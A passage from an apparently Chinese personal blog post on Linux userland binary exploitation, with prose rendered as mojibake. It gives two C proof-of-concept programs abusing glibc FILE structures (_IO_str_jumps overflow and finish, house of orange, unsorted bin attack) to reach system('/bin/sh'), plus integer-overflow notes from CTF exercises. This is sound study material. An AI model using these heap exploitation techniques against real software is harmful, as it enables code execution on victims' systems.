<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">`#include &lt;stdlib.h&gt;`</span><br><span class="line">`#include &lt;stdio.h&gt;`</span><br><span class="line">`#include &lt;string.h&gt;`</span><br><span class="line">`int main(void)`</span><br><span class="line">`&#123;`</span><br><span class="line">     `char stack_buf[100];`</span><br><span class="line">     `scanf(&quot;%s&quot;,stack_buf);`</span><br><span class="line">     `scanf(&quot;%s&quot;,stack_buf);`</span><br><span class="line">     `return 0;`	</span><br><span class="line">`&#125;`</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è°ƒç”¨å‰ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p _IO_2_1_stdin_</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="C:\Users\shizihang\AppData\Roaming\Typora\typora-user-images\1749198866913.png" alt="1749198866913" style="zoom:50%;" />

<p>è°ƒç”¨åï¼š</p>
<img src="C:\Users\shizihang\AppData\Roaming\Typora\typora-user-images\1749198897715.png" alt="1749198897715" style="zoom:50%;" />

<p> <strong>stdin åˆå§‹åŒ–çš„å†…å­˜æ˜¯åœ¨å †ä¸Šåˆ†é…</strong>å‡ºæ¥çš„ï¼Œåœ¨è¿™é‡Œ<strong>å †çš„åŸºå€æ˜¯ 0x405000</strong>ï¼Œå› ä¸ºä¹‹å‰æ²¡æœ‰å †åˆ†é…å› æ­¤<strong>ç¼“å†²åŒºçš„åœ°å€ä¹Ÿæ˜¯ 0x405010</strong> ï¼š <img src="/linux%E7%94%A8%E6%88%B7%E5%B1%82pwn/1749199003335.png" alt="1749199003335"></p>
<p>ä½†å› ä¸ºå‰é¢æœ‰ä¸€ä¸ªtcacheï¼Œæ‰€ä»¥èµ·å§‹åœ°å€åœ¨ 0x405260 </p>
<p> æ¥ä¸‹æ¥æˆ‘ä»¬å°è¯•<strong>ä¿®æ”¹_IO_buf_base</strong> æ¥å®ç°<strong>ä»»æ„åœ°å€è¯»å†™</strong>ï¼Œå…¨å±€ç¼“å†²åŒº buf çš„åœ°å€æ˜¯ 0x7ffff7bec880ã€‚<strong>ä¿®æ”¹_IO_buf_base å’Œ_IO_buf_end</strong> åˆ°ç¼“å†²åŒº buf çš„åœ°å€ï¼š </p>
<p><img src="/linux%E7%94%A8%E6%88%B7%E5%B1%82pwn/1749199066835.png" alt="1749199066835"></p>
<p> ä¹‹å <strong>scanf çš„è¯»å…¥æ•°æ®</strong>å°±ä¼šå†™å…¥åˆ° 0x7ffff7bec880 çš„ä½ç½®ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥çœ‹åˆ°**_IO_read_ptrã€_IO_read_baseã€_IO_read_endã€_IO_buf_baseã€_IO_buf_end** å€¼ä¹Ÿæ ¹æ®_IO_buf_base çš„å€¼è€Œæœ‰æ‰€ä¿®æ”¹ï¼š </p>
<p><strong>5._IO_str_jumps -&gt; overflowï¼ˆsystemåœ¨allocate_bufferä¸­ï¼‰</strong></p>
<p>libcä¸­ä¸ä»…ä»…åªæœ‰IO_file_jumpsè¿™ä¹ˆä¸€ä¸ªvtableï¼Œè¿˜æœ‰ä¸€ä¸ªå«IO_str_jumpsçš„ ï¼Œè¿™ä¸ª vtable ä¸åœ¨ check èŒƒå›´ä¹‹å†…ã€‚æ‰€ä»¥åªè¦å°†vtableæ”¹ä¸ºIO_str_jumpså°±è¡Œ</p>
<p> 0</p>
<p>æœ€åæ„é€ ç»“æœï¼š<img src="/linux%E7%94%A8%E6%88%B7%E5%B1%82pwn/1749199286912.png" alt="1749199286912"></p>
<p>æ„é€ è¿‡ç¨‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">`#include &lt;stdio.h&gt;`</span><br><span class="line">`#include &lt;stdlib.h&gt;`</span><br><span class="line">`#include &lt;string.h&gt;`</span><br><span class="line">`int winner ( char *ptr);`</span><br><span class="line">`int main()`</span><br><span class="line">`&#123;`</span><br><span class="line">    `char *p1, *p2;`</span><br><span class="line">    `size_t io_list_all, *top;`</span><br><span class="line">    </span><br><span class="line">    `// unsorted bin attack`</span><br><span class="line">    `p1 = malloc(0x400-16);`</span><br><span class="line">    `top = (size_t *) ( (char *) p1 + 0x400 - 16);`</span><br><span class="line">    `top[1] = 0xc01;`</span><br><span class="line">    `p2 = malloc(0x1000);`</span><br><span class="line">    `io_list_all = top[2] + 0x9a8;`</span><br><span class="line">    `top[3] = io_list_all - 0x10;`</span><br><span class="line">    </span><br><span class="line">    `// _IO_str_overflow conditions`æ„é€ å¦‚ä¸‹ï¼š</span><br><span class="line">    `char binsh_in_libc[] = &quot;/bin/sh&quot;; // we can found &quot;/bin/sh&quot; in libc, here i create it in stack`</span><br><span class="line">    `top[0] = 0;`</span><br><span class="line">    `top[4] = 0; // write_base`</span><br><span class="line">    `top[5] = ((size_t)&amp;binsh_in_libc-100)/2 + 1; // write_ptr`</span><br><span class="line">    `top[7] = 0; // buf_base`</span><br><span class="line">    `top[8] = top[5] - 1; // buf_end`</span><br><span class="line">    `// house_of_orange conditions`</span><br><span class="line">    `top[1] = 0x61;`</span><br><span class="line">    //top[20] = (size_t) &amp;top[18];</span><br><span class="line">     top[21] = 2;</span><br><span class="line">     top[22] = 3;</span><br><span class="line">     top[24] = -1;</span><br><span class="line">     top[27] = (size_t)stdin - 0x1140; // _IO_str_jumpsåœ°å€</span><br><span class="line">     top[28] = (size_t) &amp;winner;</span><br><span class="line"></span><br><span class="line">     //Finally, trigger the whole chain by calling malloc </span><br><span class="line">     malloc(10);</span><br><span class="line">     return 0;</span><br><span class="line">     `&#125;`</span><br><span class="line">`int winner(char *ptr)`</span><br><span class="line">`&#123;` </span><br><span class="line">    `system(ptr);`</span><br><span class="line">    `return 0;`</span><br><span class="line">`&#125;`</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç»“æœï¼š<img src="C:\Users\shizihang\AppData\Roaming\Typora\typora-user-images\1749199439351.png" alt="1749199439351" style="zoom:50%;" /></p>
<p>ç„¶åå†è°ƒç”¨mallocå°±ä¼šå°† <strong>mian_arena_88+0x68å¤„çš„_chain</strong>æˆåŠŸè¡”æ¥åˆ°fake_fileï¼Œæ­¤æ—¶returnå°±ä¼šè°ƒç”¨ IO_str_overflowå‡½æ•° </p>
<p><strong>6._IO_str_jumps -&gt; finishï¼ˆsystemåœ¨free_bufferä¸­ï¼‰</strong></p>
<p>æ„é€ ç»“æœï¼š<img src="/linux%E7%94%A8%E6%88%B7%E5%B1%82pwn/1749199734904.png" alt="1749199734904"></p>
<p>ä¾‹å­ï¼š</p>
<pre><code>`#include &lt;stdio.h&gt;`
`#include &lt;stdlib.h&gt;`
`#include &lt;string.h&gt;`
`int winner ( char *ptr);`
`int main()`
`&#123;`
    `char *p1, *p2;`
    `size_t io_list_all, *top;`
    `// unsorted bin attack`
    `p1 = malloc(0x400-16);`
    `top = (size_t *) ( (char *) p1 + 0x400 - 16);`
    `top[1] = 0xc01;`
    `p2 = malloc(0x1000);`
    `io_list_all = top[2] + 0x9a8;`
    `top[3] = io_list_all - 0x10;`
``    
     // _IO_str_overflow conditions
     char binsh_in_libc[] = &quot;/bin/sh&quot;; // we can found    &quot;/bin/sh&quot; in libc, here i create it in stack
     top[0] = 0;
     top[4] = 0; // write_base
     top[5] = 1; // write_ptr
     top[7] = (size_t)&amp;binsh_in_libc; // buf_base
     top[8] = 0; // buf_end

     // house_of_orange conditions
     top[1] = 0x61;
     //top[20] = (size_t) &amp;top[18];
     top[21] = 2;
     top[22] = 3;
     top[24] = -1;
     top[27] = (size_t)stdin - 0x1160 -8; // _IO_str_jumpsåœ°å€
     top[29] = (size_t) &amp;winner;

/* Finally, trigger the whole chain by calling malloc */
     malloc(10);
     return 0;
 `&#125;`
`int winner(char *ptr)`
`&#123;` 
    `system(ptr);`
    `return 0;`
`&#125;`
</code></pre>
<p>â€‹<br>ç»“æœï¼š</p>
<img src="C:\Users\shizihang\AppData\Roaming\Typora\typora-user-images\1749199800577.png" alt="1749199800577" style="zoom:50%;" />





<h2 id="æ•´æ•°æº¢å‡º"><a href="#æ•´æ•°æº¢å‡º" class="headerlink" title="æ•´æ•°æº¢å‡º"></a>æ•´æ•°æº¢å‡º</h2><table>
<thead>
<tr>
<th align="center">ç±»å‹</th>
<th align="center">å­—èŠ‚</th>
<th align="center">èŒƒå›´</th>
</tr>
</thead>
<tbody><tr>
<td align="center">short int</td>
<td align="center">2byte(word)</td>
<td align="center">0<del>32767(0</del>0x7fff) -32768<del>-1(0x8000</del>0xffff)</td>
</tr>
<tr>
<td align="center">unsigned short int</td>
<td align="center">2byte(word)</td>
<td align="center">0<del>65535(0</del>0xffff)</td>
</tr>
<tr>
<td align="center">int</td>
<td align="center">4byte(dword)</td>
<td align="center">0<del>2147483647(0</del>0x7fffffff) -2147483648<del>-1(0x80000000</del>0xffffffff)</td>
</tr>
<tr>
<td align="center">unsigned int</td>
<td align="center">4byte(dword)</td>
<td align="center">0<del>4294967295(0</del>0xffffffff)</td>
</tr>
<tr>
<td align="center">long int</td>
<td align="center">8byte(qword)</td>
<td align="center">æ­£: 0<del>0x7fffffffffffffff è´Ÿ: 0x8000000000000000</del>0xffffffffffffffff</td>
</tr>
<tr>
<td align="center">unsigned long int</td>
<td align="center">8byte(qword)</td>
<td align="center">0~0xffffffffffffffff</td>
</tr>
</tbody></table>
<h4 id="ä¸Šç•Œæº¢å‡º"><a href="#ä¸Šç•Œæº¢å‡º" class="headerlink" title="ä¸Šç•Œæº¢å‡º"></a>ä¸Šç•Œæº¢å‡º</h4><p><img src="/linux%E7%94%A8%E6%88%B7%E5%B1%82pwn/1752157286946.png" alt="1752157286946"></p>
<p>ä¸‹ç•Œæº¢å‡ºä¹Ÿæ˜¯ä¸€æ ·ï¼Œåªæ˜¯å°†addæ”¹ä¸ºsub</p>
<h4 id="æƒ…å†µ"><a href="#æƒ…å†µ" class="headerlink" title="æƒ…å†µ"></a>æƒ…å†µ</h4><p><strong>1.æœªé™åˆ¶èŒƒå›´</strong></p>
<p><img src="/linux%E7%94%A8%E6%88%B7%E5%B1%82pwn/1752157935442.png" alt="1752157935442"></p>
<p>å †åªç”³è¯·äº†0x20å¤§å°ä½†å´èƒ½è¾“å…¥å¾ˆå¤šä¸œè¥¿</p>
<p><strong>2.é”™è¯¯çš„ç±»å‹è½¬æ¢</strong></p>
<p>èŒƒå›´å¤§çš„å˜é‡èµ‹å€¼ç»™èŒƒå›´å°çš„ï¼Œå¦‚longint-&gt;intï¼Œä»å…«å­—èŠ‚å˜ä¸ºå››å­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯å°†å…¶æˆªæ–­äº†ï¼Œå¦‚0x12345678åªå‰©ä¸‹0x5678</p>
<p><strong>3.åªåšäº†å•è¾¹é™åˆ¶</strong></p>
<p>æ­£å¸¸cè¯­è¨€å®šä¹‰ä¸€ä¸ªæ•´å½¢æ˜¯æœ‰ç¬¦å·çš„ï¼Œä½†æ˜¯å½“è°ƒç”¨readå‡½æ•°æ—¶ï¼Œå…¶ç¬¬ä¸‰ä¸ªå‚æ•°ä¸ºsize_tï¼Œæ— ç¬¦å·çš„ï¼Œæ‰€ä»¥ä¼šé€ æˆ-1å˜ä¸º0xffff</p>
<p>é¢˜ç›®ï¼šbuuctfä¸Šç¬¬åä¹é¢˜ï¼Œå…ˆå®šä¹‰ä¸€ä¸ªæ•°å°äº10ï¼Œå› æ­¤scanfè¾“å…¥-1&lt;10ï¼Œä½†æ˜¯å½“è°ƒç”¨readå°±ä¼šåŠ å¤§è¾“å…¥é•¿åº¦ï¼Œä»è€Œä½¿ç”¨æ ˆæº¢å‡º</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>æ–‡ç« ä½œè€…: </span><span class="post-copyright-info"><a href="https://hfddh666.github.io">hfddh666</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>æ–‡ç« é“¾æ¥: </span><span class="post-copyright-info"><a href="https://hfddh666.github.io/2025/09/21/linux%E7%94%A8%E6%88%B7%E5%B1%82pwn/">https://hfddh666.github.io/2025/09/21/linux%E7%94%A8%E6%88%B7%E5%B1%82pwn/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>ç‰ˆæƒå£°æ˜: </span><span class="post-copyright-info">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-SA 4.0</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜æ¥æº <a href="https://hfddh666.github.io" target="_blank">hfddh666's Blog</a>ï¼</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn/">pwn</a></div><div class="post-share"><div class="social-share" data-image="/img/butterfly-icon.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/09/26/kernel-basic/" title="kernel basic"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">ä¸Šä¸€ç¯‡</div><div class="info-item-2">kernel basic</div></div><div class="info-2"><div class="info-item-1">linux kernelä¸€.åŸºç¡€çŸ¥è¯†1.æ“ä½œç³»ç»Ÿå†…æ ¸ 2.åˆ†çº§ä¿æŠ¤ç¯é€šè¿‡ç¡¬ä»¶å®ç°  **ç”¨æˆ·æ€ï¼š**CPUå±äºring 3çº§åˆ«ï¼Œè¿è¡Œå¹³å¸¸å†™çš„ä»£ç (C&#x2F;C++) **å†…æ ¸æ€ï¼š**CPUå±äºring 0çº§åˆ« 3.çŠ¶æ€åˆ‡æ¢CPU åœ¨ä¸åŒçš„ç‰¹æƒçº§é—´è¿›è¡Œåˆ‡æ¢ä¸»è¦æœ‰ä¸¤ä¸ªé€”å¾„ï¼š â€‹        (1)ä¸­æ–­ä¸å¼‚å¸¸ï¼ˆinterrupt &amp; exceptionï¼‰ï¼šå½“ CPU æ”¶åˆ°ä¸€ä¸ªä¸­æ–­ &#x2F; å¼‚å¸¸æ—¶ï¼Œä¼šåˆ‡æ¢åˆ° ring0ï¼Œå¹¶                                   æ ¹æ®ä¸­æ–­æè¿°ç¬¦è¡¨ç´¢å¼•å¯¹åº”çš„ä¸­æ–­å¤„ç†ä»£ç ä»¥æ‰§è¡Œã€‚ â€‹        (2)ç‰¹æƒçº§ç›¸å…³æŒ‡ä»¤ï¼šå½“ CPU è¿è¡Œè¿™äº›æŒ‡ä»¤æ—¶ä¼šå‘ç”Ÿè¿è¡ŒçŠ¶æ€çš„æ”¹å˜ï¼Œä¾‹å¦‚ iret æŒ‡ä»¤ï¼ˆring0-&gt;ring3ï¼‰æˆ–æ˜¯ sysenter æŒ‡ä»¤ï¼ˆring3-&gt;ring0ï¼‰ã€‚ â€‹        åŸºäºè¿™äº›ç‰¹æƒçº§åˆ‡æ¢çš„æ–¹å¼ï¼Œç°ä»£æ“ä½œç³»ç»Ÿçš„å¼€å‘è€…åŒ…è£…å‡ºäº†ç³»ç»Ÿè°ƒç”¨ï¼ˆsyscallï¼‰ï¼Œä½œä¸ºç”± â€œç”¨æˆ·æ€â€ åˆ‡æ¢åˆ° â€œå†…æ ¸æ€â€ çš„å…¥å£ï¼Œä»è€Œæ‰§è¡Œå†…æ ¸ä»£ç æ¥å®Œæˆç”¨æˆ·è¿›ç¨‹æ‰€éœ€çš„ä¸€äº›åŠŸèƒ½ã€‚å½“ç”¨æˆ·è¿›ç¨‹æƒ³è¦è¯·æ±‚æ›´é«˜æƒé™çš„æœåŠ¡æ—¶ï¼Œ...</div></div></div></a><a class="pagination-related" href="/2025/09/20/%E6%8C%87%E5%8D%97/" title="æŒ‡å—"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">ä¸‹ä¸€ç¯‡</div><div class="info-item-2">æŒ‡å—</div></div><div class="info-2"><div class="info-item-1">1.hexo g 2.hexo s 3.hexo d 4.hexo new post â€œtitleâ€ </div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>ç›¸å…³æ¨è</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/02/12/ret2gets/" title="ret2gets"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-02-12</div><div class="info-item-2">ret2gets</div></div><div class="info-2"><div class="info-item-1">å‰è¨€ä»Šå¤©åˆšå¥½çœ‹åˆ°litctf2025çš„ä¸€é“pwné¢˜ï¼Œæ˜¯ä¸€ç§æˆ‘æ²¡æœ‰è§è¿‡çš„æ–¹æ³•ï¼Œåé¢æŸ¥äº†ä¸€ä¸‹æ˜¯å«åšret2gets,ç„¶åå°±æµ…æµ…çš„å­¦äº†å­¦ã€‚ret2getsé€‚ç”¨äºæ²¡æœ‰pop_rdiè¿™ä¸€ç±»æ§åˆ¶rdiæ—¶ä½¿ç”¨çš„æ–¹æ³• æºç 123456789101112#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main() &#123;    puts(&quot;ret2gets&amp;ret2system&quot;);    char buffer[0x20];      gets(buffer);          return 0;&#125;void backdoor() &#123;    system(&quot;echo hi&quot;); &#125;//æ‰§è¡Œgcc -o ret2system ret2system.c -fno-stack-protector -z execstack -no-pie -fno-picç”Ÿæˆæ–‡ä»¶  ret2systemexp 12345678910111213from pwn import *c...</div></div></div></a><a class="pagination-related" href="/2025/12/12/nss%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/" title="nssåšé¢˜è®°å½•"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-12</div><div class="info-item-2">nssåšé¢˜è®°å½•</div></div><div class="info-2"><div class="info-item-1">[LitCTF 2024]ATM12345678910111213141516â¯ checksec flag[*] &#x27;/home/voyager/flag&#x27;    Arch:       amd64-64-little    RELRO:      Full RELRO    Stack:      No canary found    NX:         NX enabled    PIE:        No PIE (0x400000)    SHSTK:      Enabled    IBT:        Enabled    Stripped:   No~ via C v11.4.0-gcc via ğŸ v3.10.12 â¯   12345678910111213141516171819202122232425262728from pwn import*from LibcSearcher import*r=remote(&quot;node4.anna.nssctf.cn&quot;,22296)#r=process(&quot;./fla...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">hfddh666</div><div class="author-info-description">æ¬¢è¿è®¿é—® hfddh666 çš„åšå®¢ï¼</div><div class="site-data"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">0</div></a></div><a id="card-info-btn" href="/about/"><i class="fab fa-github"></i><span>å…³äºæˆ‘</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>å…¬å‘Š</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>ç›®å½•</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E6%8C%87%E4%BB%A4"><span class="toc-number">1.</span> <span class="toc-text">åŸºç¡€æŒ‡ä»¤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#IDA"><span class="toc-number">1.0.1.</span> <span class="toc-text">IDA:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#gdb"><span class="toc-number">1.0.2.</span> <span class="toc-text">gdb:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8E%A5%E6%94%B6%E6%95%B0%E6%8D%AE%EF%BC%9A"><span class="toc-number">1.0.3.</span> <span class="toc-text">æ¥æ”¶æ•°æ®ï¼š</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80"><span class="toc-number">1.0.4.</span> <span class="toc-text">åŸºç¡€</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB"><span class="toc-number">2.</span> <span class="toc-text">æ ˆè¿ç§»</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E8%BF%9B%E8%A1%8C%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E6%94%B9%E5%86%99"><span class="toc-number">2.0.1.</span> <span class="toc-text">1.è¿›è¡Œä»»æ„åœ°å€æ”¹å†™</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%A2%9E%E5%8A%A0%E6%BA%A2%E5%87%BA%E9%95%BF%E5%BA%A6"><span class="toc-number">2.0.2.</span> <span class="toc-text">2.å¢åŠ æº¢å‡ºé•¿åº¦</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%9Abuuctf%E7%AC%AC26%E9%A2%98"><span class="toc-number">2.0.3.</span> <span class="toc-text">é¢˜ç›®ï¼šbuuctfç¬¬26é¢˜</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#orw%E6%B2%99%E7%9B%92"><span class="toc-number">3.</span> <span class="toc-text">orwæ²™ç›’</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="toc-number">4.</span> <span class="toc-text">æ ˆæº¢å‡º</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ret2libc"><span class="toc-number">4.0.1.</span> <span class="toc-text">ret2libc</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">4.0.2.</span> <span class="toc-text">!!!</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ret2shellcode"><span class="toc-number">4.0.3.</span> <span class="toc-text">ret2shellcode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ropchain"><span class="toc-number">4.0.4.</span> <span class="toc-text">ropchain</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%AD%E7%BA%A7rop"><span class="toc-number">4.0.5.</span> <span class="toc-text">ä¸­çº§rop</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SROP"><span class="toc-number">4.0.6.</span> <span class="toc-text">SROP</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%9F%BA%E7%A1%80"><span class="toc-number">5.</span> <span class="toc-text">æ ¼å¼åŒ–å­—ç¬¦ä¸²åŸºç¡€</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%B4%A9%E6%BA%83%EF%BC%9A"><span class="toc-number">5.0.1.</span> <span class="toc-text">ç¨‹åºå´©æºƒï¼š</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%81%EF%BC%81%EF%BC%81"><span class="toc-number">5.0.2.</span> <span class="toc-text">ï¼ï¼ï¼</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A6%86%E7%9B%96%E5%86%85%E5%AD%98"><span class="toc-number">5.0.3.</span> <span class="toc-text">è¦†ç›–å†…å­˜</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BF%AB%E9%80%9F%E8%AE%A1%E7%AE%97%E5%81%8F%E7%A7%BBfmtarg"><span class="toc-number">5.0.4.</span> <span class="toc-text">å¿«é€Ÿè®¡ç®—åç§»fmtarg</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%EF%BC%9Afmtstr-payload"><span class="toc-number">5.0.5.</span> <span class="toc-text">å‡½æ•°ï¼šfmtstr_payload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E5%9F%BA%E7%A1%80"><span class="toc-number">6.</span> <span class="toc-text">å †åŸºç¡€</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E6%8A%80%E6%9C%AF"><span class="toc-number">6.0.1.</span> <span class="toc-text">åŸºç¡€æŠ€æœ¯</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#off-by-one"><span class="toc-number">6.0.2.</span> <span class="toc-text">off-by-one</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#unlink"><span class="toc-number">6.0.3.</span> <span class="toc-text">unlink</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#use-after-free"><span class="toc-number">6.0.4.</span> <span class="toc-text">use after free</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#fastbin-attack"><span class="toc-number">6.0.5.</span> <span class="toc-text">fastbin attack</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unsortedbin-attack"><span class="toc-number">6.0.6.</span> <span class="toc-text">Unsortedbin attack</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#largebin-attack"><span class="toc-number">6.0.7.</span> <span class="toc-text">largebin attack</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#tcache%E5%9F%BA%E7%A1%80"><span class="toc-number">6.0.8.</span> <span class="toc-text">tcacheåŸºç¡€</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#tcache-attack"><span class="toc-number">6.0.9.</span> <span class="toc-text">tcache attack</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91shell%E6%8A%80%E5%B7%A7%EF%BC%9A"><span class="toc-number">6.0.10.</span> <span class="toc-text">è§¦å‘shellæŠ€å·§ï¼š</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E9%A2%9D%E5%A4%96%E6%8A%80%E6%9C%AF"><span class="toc-number">7.</span> <span class="toc-text">å †é¢å¤–æŠ€æœ¯</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#House-of-Einherjar"><span class="toc-number">7.0.1.</span> <span class="toc-text">House of Einherjar</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#House-of-Force%EF%BC%88top-chunk%E6%93%8D%E4%BD%9C%EF%BC%89"><span class="toc-number">7.0.2.</span> <span class="toc-text">House of Forceï¼ˆtop chunkæ“ä½œï¼‰</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#House-of-Lore-small-bin"><span class="toc-number">7.0.3.</span> <span class="toc-text">House of Lore(small bin)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#House-of-Orange%EF%BC%88%E6%97%A0free%EF%BC%89"><span class="toc-number">7.0.4.</span> <span class="toc-text">House of Orangeï¼ˆæ— freeï¼‰</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#House-of-Rabbit-%E4%B8%80%E8%88%AC%E4%B8%BAfast-bin"><span class="toc-number">7.0.5.</span> <span class="toc-text">House of Rabbit(ä¸€èˆ¬ä¸ºfast bin)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#House-of-Roman"><span class="toc-number">7.0.6.</span> <span class="toc-text">House of Roman</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#House-of-Pig"><span class="toc-number">7.0.7.</span> <span class="toc-text">House of Pig</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#I-Ofile"><span class="toc-number">8.</span> <span class="toc-text">I&#x2F;Ofile</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a 